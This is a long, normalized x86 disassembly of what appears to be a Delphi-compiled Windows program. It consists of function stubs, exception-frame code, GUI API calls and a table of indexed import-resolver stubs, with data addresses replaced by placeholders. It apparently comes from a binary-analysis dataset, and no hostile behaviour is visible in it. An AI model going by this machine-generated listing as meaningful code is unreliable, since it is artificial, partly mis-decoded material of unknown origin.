jmp sub_4039ac
sub_458be4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458ee0
jmp sub_4036f8
sub_45927c
jmp sub_4036f8
sub_459375
jmp sub_4039ac
sub_45937c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459399
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
sub_459392
jmp sub_4039ac
sub_459399
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4593a0
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_423928
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_455de8
sub_4593c0
call sub_403258
retn
sub_459418
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45947e
jmp sub_4039ac
sub_45962c
jmp sub_4036f8
sub_459658
xor edx edx
call sub_45614c
retn
sub_459660
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_45614c
mov eax ebx
call sub_43d180
pop ebx
retn
sub_4596e6
jmp sub_4039ac
sub_4596ed
pop ebx
pop ecx
pop ebp
retn
sub_4596f4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_443708
push eax
call PostMessageA
pop ebx
retn
sub_4598f8
jmp sub_4039ac
sub_459999
jmp sub_4039ac
sub_4599a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4599c2
mov eax [ rw-data ]
call sub_45bbdc
retn
sub_4599bb
jmp sub_4039ac
sub_4599c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4599df
lea eax [ ebp - 0x20 ]
call sub_403fa8
retn
sub_4599d8
jmp sub_4039ac
sub_4599df
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459ac0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43c32c
retn
mov edx eax
mov eax [ rw-data ]
call sub_45b230
retn
sub_459e44
mov edx eax
mov eax [ rw-data ]
call sub_45cc50
mov al 0x1
retn
sub_459f2c
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_459e54
sub_459f40
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_459e54
sub_459f54
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_459e54
sub_459f68
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_459e54
sub_459f7c
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45a0e7
jmp sub_4039ac
sub_45a0ee
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a0f4
push ebx
mov ebx eax
mov eax ebx
call sub_442020
mov eax ebx
call sub_4421a4
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4596f4
sub_45a36a
jmp sub_4039ac
sub_45a371
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a378
push ebx
mov ebx edx
mov edx ebx
call sub_442488
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43c434
pop ebx
retn
sub_45a3cc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45a434
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45a3e4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45a434
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45a400
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45a434
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45a418
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45a434
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45a6b4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a6c0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a6cc
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a6d8
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a6e4
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a6f0
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a6fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_413f44
pop esi
pop ebx
retn
sub_45a710
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45a72c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413f44
pop esi
pop ebx
retn
sub_45a740
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45a748
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413f44
pop esi
pop ebx
retn
sub_45a75c
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45a838
mov eax [ eax + 0x54 ]
call sub_413de8
retn
sub_45a844
mov eax [ eax + 0x54 ]
call sub_414088
retn
sub_45aa97
jmp sub_4039ac
sub_45aadb
jmp sub_4039ac
sub_45aae2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45ab30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a930
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403ffc
pop esi
pop ebx
retn
sub_45ab9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_413f44
pop esi
pop ebx
retn
sub_45abb0
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45adb5
jmp sub_4039ac
sub_45adbc
pop ebx
mov esp ebp
pop ebp
retn
sub_45adc4
inc [ eax + 0x8c ]
retn
sub_45adcc
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45adec
sub_45adec
xor edx edx
call sub_45b230
retn
sub_45b222
jmp sub_4039ac
sub_45b2a9
jmp sub_4039ac
sub_45b2b8
add eax 0x30
call sub_40d250
retn
sub_45b2fc
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4036f8#3
jmp sub_4036f8
sub_45b352
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45cc50
call sub_403a60
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45ba21
jmp sub_4039ac
sub_45ba28
pop ebx
mov esp ebp
pop ebp
retn
sub_45bbb0
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45bbdc
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45bc08
xor edx edx
call sub_45bb00
retn
sub_45bc10
mov dl 0x1
call sub_45bb00
retn
sub_45bc84
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45bc9c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45bd69
jmp sub_4039ac
sub_45bd70
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c4ba
jmp sub_4036f8
sub_45cab8
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_45cb0e
jmp sub_4036f8
j_sub_4036f8#2
jmp sub_4036f8
sub_45cc2e
jmp sub_4039ac
sub_45cc35
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45cc3c
call sub_40cda0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45ce35
jmp sub_4039ac
sub_45ce3c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45cf03
jmp sub_4039ac
sub_45cf0a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d0e0
jmp sub_4039ac
sub_45d0e7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d148
jmp sub_4039ac
sub_45d14f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d158
call sub_45cf20
retn
sub_45d343
jmp sub_4036f8
sub_45d39c
jmp sub_4039ac
sub_45d3a3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d4d1
jmp sub_4039ac
sub_45d630
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45d92f
jmp sub_4039ac
sub_45d95e
jmp sub_4039ac
sub_45da6a
jmp sub_4039ac
sub_45da71
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45de02
jmp sub_4039ac
sub_45de09
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45df2c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45df77
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45df88
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45df98
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45e00b
jmp sub_4039ac
sub_45e012
pop ebp
retn
sub_45e014
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45dfa8
call sub_403d7c
call sub_45df2c
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_453ce0
call sub_413a38
sub_45e1e5
jmp sub_4039ac
sub_45e1ec
pop ebp
retn
sub_45e1f0
sub [ rw-data ] 0x1
retn
sub_45e415
jmp sub_4039ac
sub_45e41c
pop ebp
retn
sub_45e420
sub [ rw-data ] 0x1
retn
sub_45e540
jmp sub_4039ac
sub_45e578
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_45f3d8
sub_45e594
mov eax 0x0
call sub_45f324
jmp eax
sub_45e5a0
retn
sub_45e5a4
mov eax 0x1
call sub_45f324
jmp eax
sub_45e5b0
retn
sub_45e5b4
mov eax 0x2
call sub_45f324
jmp eax
sub_45e5c0
retn
sub_45e5c4
mov eax 0x3
call sub_45f324
jmp eax
sub_45e5d0
retn
sub_45e5d4
mov eax 0x4
call sub_45f324
jmp eax
sub_45e5e0
retn
sub_45e5e4
mov eax 0x5
call sub_45f324
jmp eax
sub_45e5f0
retn
sub_45e5f4
mov eax 0x6
call sub_45f324
jmp eax
sub_45e600
retn
sub_45e604
mov eax 0x7
call sub_45f324
jmp eax
sub_45e610
retn
sub_45e614
mov eax 0x8
call sub_45f324
jmp eax
sub_45e620
retn
sub_45e624
mov eax 0x9
call sub_45f324
jmp eax
sub_45e630
retn
sub_45e634
mov eax 0xa
call sub_45f324
jmp eax
sub_45e640
retn
sub_45e644
mov eax 0xb
call sub_45f324
jmp eax
sub_45e650
retn
sub_45e654
mov eax 0xc
call sub_45f324
jmp eax
sub_45e660
retn
sub_45e664
mov eax 0xd
call sub_45f324
jmp eax
sub_45e670
retn
sub_45e674
mov eax 0xe
call sub_45f324
jmp eax
sub_45e680
retn
sub_45e684
mov eax 0xf
call sub_45f324
jmp eax
sub_45e690
retn
sub_45e694
mov eax 0x10
call sub_45f324
jmp eax
sub_45e6a0
retn
sub_45e6a4
mov eax 0x11
call sub_45f324
jmp eax
sub_45e6b0
retn
sub_45e6b4
mov eax 0x12
call sub_45f324
jmp eax
sub_45e6c0
retn
sub_45e6c4
mov eax 0x13
call sub_45f324
jmp eax
sub_45e6d0
retn
sub_45e6d4
mov eax 0x14
call sub_45f324
jmp eax
sub_45e6e0
retn
sub_45e6e4
mov eax 0x15
call sub_45f324
jmp eax
sub_45e6f0
retn
sub_45e6f4
mov eax 0x16
call sub_45f324
jmp eax
sub_45e700
retn
sub_45e704
mov eax 0x17
call sub_45f324
jmp eax
sub_45e710
retn
sub_45e714
mov eax 0x18
call sub_45f324
jmp eax
sub_45e720
retn
sub_45e724
mov eax 0x19
call sub_45f324
jmp eax
sub_45e730
retn
sub_45e734
mov eax 0x1a
call sub_45f324
jmp eax
sub_45e740
retn
sub_45e744
mov eax 0x1b
call sub_45f324
jmp eax
sub_45e750
retn
sub_45e754
mov eax 0x1c
call sub_45f324
jmp eax
sub_45e760
retn
sub_45e764
mov eax 0x1d
call sub_45f324
jmp eax
sub_45e770
retn
sub_45e774
mov eax 0x1e
call sub_45f324
jmp eax
sub_45e780
retn
sub_45e784
mov eax 0x1f
call sub_45f324
jmp eax
sub_45e790
retn
sub_45e794
mov eax 0x20
call sub_45f324
jmp eax
sub_45e7a0
retn
sub_45e7a4
mov eax 0x21
call sub_45f324
jmp eax
sub_45e7b0
retn
sub_45e7b4
mov eax 0x22
call sub_45f324
jmp eax
sub_45e7c0
retn
sub_45e7c4
mov eax 0x23
call sub_45f324
jmp eax
sub_45e7d0
retn
sub_45e7d4
mov eax 0x24
call sub_45f324
jmp eax
sub_45e7e0
retn
sub_45e7e4
mov eax 0x25
call sub_45f324
jmp eax
sub_45e7f0
retn
sub_45e7f4
mov eax 0x26
call sub_45f324
jmp eax
sub_45e800
retn
sub_45e804
mov eax 0x27
call sub_45f324
jmp eax
sub_45e810
retn
sub_45e814
mov eax 0x28
call sub_45f324
jmp eax
sub_45e820
retn
sub_45e824
mov eax 0x29
call sub_45f324
jmp eax
sub_45e830
retn
sub_45e834
mov eax 0x2a
call sub_45f324
jmp eax
sub_45e840
retn
sub_45e844
mov eax 0x2b
call sub_45f324
jmp eax
sub_45e850
retn
sub_45e854
mov eax 0x2c
call sub_45f324
jmp eax
sub_45e860
retn
sub_45e864
mov eax 0x2d
call sub_45f324
jmp eax
sub_45e870
retn
sub_45e874
mov eax 0x2e
call sub_45f324
jmp eax
sub_45e880
retn
sub_45e884
mov eax 0x2f
call sub_45f324
jmp eax
sub_45e890
retn
sub_45e894
mov eax 0x30
call sub_45f324
jmp eax
sub_45e8a0
retn
sub_45e8a4
mov eax 0x31
call sub_45f324
jmp eax
sub_45e8b0
retn
sub_45e8b4
mov eax 0x32
call sub_45f324
jmp eax
sub_45e8c0
retn
sub_45e8c4
mov eax 0x33
call sub_45f324
jmp eax
sub_45e8d0
retn
sub_45e8d4
mov eax 0x34
call sub_45f324
jmp eax
sub_45e8e0
retn
sub_45e8e4
mov eax 0x35
call sub_45f324
jmp eax
sub_45e8f0
retn
sub_45e8f4
mov eax 0x36
call sub_45f324
jmp eax
sub_45e900
retn
sub_45e904
mov eax 0x37
call sub_45f324
jmp eax
sub_45e910
retn
sub_45e914
mov eax 0x38
call sub_45f324
jmp eax
sub_45e920
retn
sub_45e924
mov eax 0x39
call sub_45f324
jmp eax
sub_45e930
retn
sub_45e934
mov eax 0x3a
call sub_45f324
jmp eax
sub_45e940
retn
sub_45e944
mov eax 0x3b
call sub_45f324
jmp eax
sub_45e950
retn
sub_45e954
mov eax 0x3c
call sub_45f324
jmp eax
sub_45e960
retn
sub_45e964
mov eax 0x3d
call sub_45f324
jmp eax
sub_45e970
retn
sub_45e974
mov eax 0x3e
call sub_45f324
jmp eax
sub_45e980
retn
sub_45e984
mov eax 0x3f
call sub_45f324
jmp eax
sub_45e990
retn
sub_45e994
mov eax 0x40
call sub_45f324
jmp eax
sub_45e9a0
retn
sub_45e9a4
mov eax 0x41
call sub_45f324
jmp eax
sub_45e9b0
retn
sub_45e9b4
mov eax 0x42
call sub_45f324
jmp eax
sub_45e9c0
retn
sub_45e9c4
mov eax 0x43
call sub_45f324
jmp eax
sub_45e9d0
retn
sub_45e9d4
mov eax 0x44
call sub_45f324
jmp eax
sub_45e9e0
retn
sub_45e9e4
mov eax 0x45
call sub_45f324
jmp eax
sub_45e9f0
retn
sub_45e9f4
mov eax 0x46
call sub_45f324
jmp eax
sub_45ea00
retn
sub_45ea04
mov eax 0x47
call sub_45f324
jmp eax
sub_45ea10
retn
sub_45ea14
mov eax 0x48
call sub_45f324
jmp eax
sub_45ea20
retn
sub_45ea24
mov eax 0x49
call sub_45f324
jmp eax
sub_45ea30
retn
sub_45ea34
mov eax 0x4a
call sub_45f324
jmp eax
sub_45ea40
retn
sub_45ea44
mov eax 0x4b
call sub_45f324
jmp eax
sub_45ea50
retn
sub_45ea54
mov eax 0x4c
call sub_45f324
jmp eax
sub_45ea60
retn
sub_45ea64
mov eax 0x4d
call sub_45f324
jmp eax
sub_45ea70
retn
sub_45ea74
mov eax 0x4e
call sub_45f324
jmp eax
sub_45ea80
retn
sub_45ea84
mov eax 0x4f
call sub_45f324
jmp eax
sub_45ea90
retn
sub_45ea94
mov eax 0x50
call sub_45f324
jmp eax
sub_45eaa0
retn
sub_45eaa4
mov eax 0x51
call sub_45f324
jmp eax
sub_45eab0
retn
sub_45eab4
mov eax 0x52
call sub_45f324
jmp eax
sub_45eac0
retn
sub_45eac4
mov eax 0x53
call sub_45f324
jmp eax
sub_45ead0
retn
sub_45ead4
mov eax 0x54
call sub_45f324
jmp eax
sub_45eae0
retn
sub_45eae4
mov eax 0x55
call sub_45f324
jmp eax
sub_45eaf0
retn
sub_45eaf4
mov eax 0x56
call sub_45f324
jmp eax
sub_45eb00
retn
sub_45eb04
mov eax 0x57
call sub_45f324
jmp eax
sub_45eb10
retn
sub_45eb14
mov eax 0x58
call sub_45f324
jmp eax
sub_45eb20
retn
sub_45eb24
mov eax 0x59
call sub_45f324
jmp eax
sub_45eb30
retn
sub_45eb34
mov eax 0x5a
call sub_45f324
jmp eax
sub_45eb40
retn
sub_45eb44
mov eax 0x5b
call sub_45f324
jmp eax
sub_45eb50
retn
sub_45eb54
mov eax 0x5c
call sub_45f324
jmp eax
sub_45eb60
retn
sub_45eb64
mov eax 0x5d
call sub_45f324
jmp eax
sub_45eb70
retn
sub_45eb74
mov eax 0x5e
call sub_45f324
jmp eax
sub_45eb80
retn
sub_45eb84
mov eax 0x5f
call sub_45f324
jmp eax
sub_45eb90
retn
sub_45eb94
mov eax 0x60
call sub_45f324
jmp eax
sub_45eba0
retn
sub_45eba4
mov eax 0x61
call sub_45f324
jmp eax
sub_45ebb0
retn
sub_45ebb4
mov eax 0x62
call sub_45f324
jmp eax
sub_45ebc0
retn
sub_45ebc4
mov eax 0x63
call sub_45f324
jmp eax
sub_45ebd0
retn
sub_45ebd4
mov eax 0x64
call sub_45f324
jmp eax
sub_45ebe0
retn
sub_45ebe4
mov eax 0x65
call sub_45f324
jmp eax
sub_45ebf0
retn
sub_45ebf4
mov eax 0x66
call sub_45f324
jmp eax
sub_45ec00
retn
sub_45ec04
mov eax 0x67
call sub_45f324
jmp eax
sub_45ec10
retn
sub_45ec14
mov eax 0x68
call sub_45f324
jmp eax
sub_45ec20
retn
sub_45ec24
mov eax 0x69
call sub_45f324
jmp eax
sub_45ec30
retn
sub_45ec34
mov eax 0x6a
call sub_45f324
jmp eax
sub_45ec40
retn
sub_45ec44
mov eax 0x6b
call sub_45f324
jmp eax
sub_45ec50
retn
sub_45ec54
mov eax 0x6c
call sub_45f324
jmp eax
sub_45ec60
retn
sub_45ec64
mov eax 0x6d
call sub_45f324
jmp eax
sub_45ec70
retn
sub_45ec74
mov eax 0x6e
call sub_45f324
jmp eax
sub_45ec80
retn
sub_45ec84
mov eax 0x6f
call sub_45f324
jmp eax
sub_45ec90
retn
sub_45f3c7
jmp sub_4039ac
sub_45f3ce
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f4c9
jmp sub_4039ac
sub_45f4d0
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45f534
jmp sub_4039ac
sub_45f53b
pop ebp
retn
sub_45f540
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_45f3d8
sub_45f575
jmp sub_4039ac
sub_45f57c
pop ebp
retn
sub_45f580
sub [ rw-data ] 0x1
retn
sub_45f80c
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_45f818
retn
sub_45f8b2
jmp sub_4039ac
sub_45f8b9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f8c0
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40357c
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_45fcda
jmp sub_4039ac
sub_45fce1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fd60
jmp sub_4039ac
sub_45fd67
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fd95
jmp sub_4039ac
sub_45fd9c
pop ebp
retn
sub_45fda0
sub [ rw-data ] 0x1
retn
sub_45ff9a
jmp sub_4039ac
sub_45ffa1
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_46007c
jmp sub_4039ac
sub_460083
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460117
jmp sub_4039ac
sub_46011e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_460194
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4602d8
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46038b
jmp sub_4039ac
sub_460392
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46046d
jmp sub_4039ac
sub_460474
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460660
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46066c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_460684
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460690
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_403824
jmp sub_403824
sub_460769
jmp sub_4039ac
sub_460770
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036f8
jmp sub_4036f8
sub_460899
jmp sub_4039ac
sub_4608a0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4608ac
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4608b8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46095e
jmp sub_4039ac
sub_460965
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460a21
jmp sub_4039ac
sub_460a28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460a45
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_460a3e
jmp sub_4039ac
sub_460a45
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_460b13
jmp sub_4039ac
sub_460b1a
pop ebx
mov esp ebp
pop ebp
retn
sub_460b23
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_460bc6
jmp sub_4039ac
sub_460bcd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_460c66
jmp sub_4039ac
sub_460c6d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_460cf2
jmp sub_4039ac
sub_460cf9
pop ecx
pop ebp
retn
sub_460cfc
mov eax [ eax + 0x4 ]
retn
sub_460d5a
jmp sub_4039ac
sub_460d61
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_460e3d
jmp sub_4039ac
sub_460e44
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460e85
jmp sub_4039ac
sub_460e8c
pop ebp
retn
sub_460e90
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_460988
sub_460ee1
jmp sub_4039ac
sub_460ee8
pop ebp
retn
sub_460eec
sub [ rw-data ] 0x1
retn
sub_461020
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c3d4
pop esi
pop ebx
retn
sub_461177
jmp sub_4039ac
sub_46117e
pop ebx
pop ecx
pop ebp
retn
sub_46124d
jmp sub_4039ac
sub_461254
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4613d7
jmp sub_4039ac
sub_4613de
pop ebp
retn
sub_4614b3
jmp sub_4039ac
sub_4614ba
pop ecx
pop ebp
retn
sub_4615e8
retn
j_sub_4615e8
jmp sub_4615e8
sub_4615f0
pop ebp
retn
sub_4615f4
sub [ rw-data ] 0x1
retn
sub_46191c
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_461930
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_461940
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_461954
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_46198d
jmp sub_4039ac
sub_461994
pop ebp
retn
sub_461998
sub [ rw-data ] 0x1
retn
sub_4619c5
jmp sub_4039ac
sub_4619cc
pop ebp
retn
sub_4619d0
sub [ rw-data ] 0x1
retn
sub_461a60
jmp sub_4039ac
sub_461a67
pop ebp
retn
sub_461a6c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4619d8
call sub_403d54
mov dl 0x1
mov eax [ r-xdata ]
call sub_4262c4
mov [ rw-data ] eax
sub_461ab9
jmp sub_4039ac
sub_461ac0
pop ebp
retn
sub_461ac4
sub [ rw-data ] 0x1
retn
sub_461c70
jmp sub_4039ac
sub_461c77
pop ebx
pop ecx
pop ebp
retn
sub_461d3c
jmp sub_4039ac
sub_461d43
pop ebx
pop ecx
pop ebp
retn
sub_461d48
mov dl [ eax + 0x63 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
retn
sub_461d54
retn
sub_461eb3
jmp sub_4039ac
sub_461ee2
jmp sub_4039ac
sub_461ee9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462073
jmp sub_4039ac
sub_4620a2
jmp sub_4039ac
sub_4620a9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462125
jmp sub_4039ac
sub_46212c
pop ebp
retn
sub_462130
sub [ rw-data ] 0x1
retn
sub_4622d8
jmp sub_4039ac
sub_4622df
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46236c
jmp sub_4039ac
sub_462373
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4039ac#9
jmp sub_4039ac
sub_4623fe
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4039ac#8
jmp sub_4039ac
sub_462600
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_462665
jmp sub_4039ac
sub_46266c
pop ebp
retn
sub_462670
sub [ rw-data ] 0x1
retn
j_sub_4039ac#7
jmp sub_4039ac
sub_4626a4
pop ebp
retn
sub_4626a8
sub [ rw-data ] 0x1
retn
sub_4626b0
push ebp
mov ebp esp
xor ecx ecx
mov cl [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
call sub_402c64
pop ebp
retn
sub_46445c
add esp 0xfffffff4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov edx 0xf
mov eax [ esp + 0x4 ]
call sub_46433c
